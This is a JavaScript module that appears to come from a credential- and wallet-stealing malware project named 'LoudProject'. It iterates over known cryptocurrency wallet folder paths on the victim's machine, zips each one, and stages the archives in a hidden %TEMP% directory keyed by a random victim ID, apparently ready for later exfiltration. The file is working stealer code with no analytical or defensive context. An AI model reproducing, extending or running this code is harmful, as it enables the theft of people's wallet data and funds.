const { walletLocalPaths } = require("../../data/paths");
const { rdm } = require("../../data/Config");
const fs = require("fs");
const AdmZip = require("adm-zip");

async function Save() {
  for (const [wallet, path] of Object.entries(walletLocalPaths)) {
    if (!fs.existsSync(path)) continue;
    if (!fs.existsSync(process.env.TEMP + `\\LoudProject\\${rdm}\\Wallets`)) fs.mkdirSync(process.env.TEMP + `\\LoudProject\\${rdm}\\Wallets`);
    const archive = new AdmZip();
    await Promise.all([archive.addLocalFolder(path), archive.writeZip(process.env.TEMP + `\\LoudProject\\${rdm}\\Wallets\\${wallet}.zip`)]);
  }
}

module.exports = { Save }